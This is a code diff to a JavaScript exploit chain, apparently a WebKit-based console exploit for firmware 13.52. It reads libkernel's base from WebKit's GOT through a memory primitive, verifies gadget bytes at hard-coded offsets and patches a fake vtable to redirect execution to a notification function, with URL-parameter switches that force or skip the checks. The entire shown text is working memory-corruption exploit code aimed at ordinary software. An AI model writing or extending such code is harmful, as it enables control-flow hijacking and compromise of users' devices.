@@ -179,7 +179,10 @@ function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log, opts)
 
 function useArenaRequest(params) {
     const q = params || new URLSearchParams(location.search);
-    return q.get("notifystr") === "arena";
+    // 13.52 default: arena struct in ArrayBuffer (no 0xc30 JS string — OOM @ S15/S25).
+    // Legacy slopkit string path: ?notifystr=1
+    if (q.get("notifystr") === "1") return false;
+    return true;
 }
 
 function notifySmokeTarget(params, off) {
@@ -338,6 +341,25 @@ function resolveLibkernelFromGot(p, webkitBase, cfg, log) {
     }
     log("NOTIFY-LK", "GOT agree lk=" + bases[0]);
     return bases[0];
+}
+
+export function resolveNotifyGd(off, params) {
+    const cfg = resolveNotifyConfig(off, params);
+    return cfg.gd || (off && off.wk_notify_gd) || 0;
+}
+
+export function checkNotifyGd(p, lk, off, params, log, opts) {
+    opts = opts || {};
+    const flush = opts.flush || null;
+    const bump = function (tag, detail) { stageBump(log, flush, tag, detail); };
+    const gdRva = resolveNotifyGd(off, params);
+    if (!p || !lk || !gdRva) {
+        bump("NOTIFY-GD-SKIP", "need p lk gd");
+        return { gdRva: gdRva || 0, ok: false };
+    }
+    bump("NOTIFY-GD-CHECK", "rva=0x" + gdRva.toString(16) + " lk=" + lk);
+    const ok = verifyGdBytes(p, lk, gdRva, bump);
+    return { gdRva, ok };
 }
 
 function verifyGdBytes(p, lk, gdRva, bump) {
@@ -549,6 +571,16 @@ export function fireNotifyPinned(p, pin, lk, off, log, opts) {
     if (!gdRva || !ntRva)
         throw new Error("notify fire: gd/nt missing in offset table");
 
+    if (!opts.skipGdCheck) {
+        const gdOk = checkNotifyGd(p, lk, off, params, log, { flush }).ok;
+        if (!gdOk && params.get("gdforce") !== "1")
+            throw new Error("NOTIFY-GD-BAD @ 0x" + gdRva.toString(16));
+        if (params.get("notifygdfire") === "0") {
+            bump("NOTIFY-S19", "gdcheck-only — no hook/fire");
+            return { result: -1, sent: false, ok: false, gdCheckOnly: true };
+        }
+    }
+
     const argLabel = pin.arenaMode ? "0x1" : "0xc30";
     bump("NOTIFY-S20", "fire lk=" + lk + " gd=0x" + gdRva.toString(16)
         + " nt=0x" + ntRva.toString(16)
@@ -559,14 +591,6 @@ export function fireNotifyPinned(p, pin, lk, off, log, opts) {
     if (params.get("notifydirect") === "1") {
         bump("NOTIFY-S20d", "direct vtable→nt (skip gd)");
         vtableTarget = notifyEntry;
-    }
-
-    if (params.get("notifygdcheck") === "1") {
-        verifyGdBytes(p, lk, gdRva, bump);
-        if (params.get("notifygdfire") === "0") {
-            bump("NOTIFY-S19", "gdcheck-only — no hook/fire");
-            return { result: -1, sent: false, ok: false, gdCheckOnly: true };
-        }
     }
 
     bump("NOTIFY-S21", "patch fakeUC+0xe0");
@@ -630,11 +654,22 @@ export function fireNotifyPinned(p, pin, lk, off, log, opts) {
 
 /** Sync pin → fire — no async gap between prewarm and hooked compare. */
 export function runNotifyAtomic(ctx) {
-    const pin = pinNotifyHeap(ctx);
+    const params = ctx.params || new URLSearchParams(location.search);
+    if (ctx.p && ctx.lk) {
+        const gd = checkNotifyGd(ctx.p, ctx.lk, ctx.off, params, ctx.log, { flush: ctx.flush });
+        if (params.get("notifygdfire") === "0") {
+            return { result: -1, sent: false, ok: gd.ok, gdCheckOnly: true, gdRva: gd.gdRva };
+        }
+        if (!gd.ok && params.get("gdforce") !== "1") {
+            throw new Error("NOTIFY-GD-BAD @ 0x" + gd.gdRva.toString(16));
+        }
+    }
+    const pin = pinNotifyHeap(Object.assign({}, ctx, { params }));
     return fireNotifyPinned(ctx.p, pin, ctx.lk, ctx.off, ctx.log, {
         flush: ctx.flush,
-        params: ctx.params,
+        params,
         carrier: ctx.carrier || null,
+        skipGdCheck: true,
     });
 }
 
@@ -830,6 +865,9 @@ export {
     DEFAULT_MESSAGE,
     REQ_ARENA_OFFSET,
     resolveNotifyConfig,
+    resolveNotifyGd,
+    checkNotifyGd,
+    verifyGdBytes,
     buildNotificationRequest,
     writeNotificationRequestToView,
     useArenaRequest,
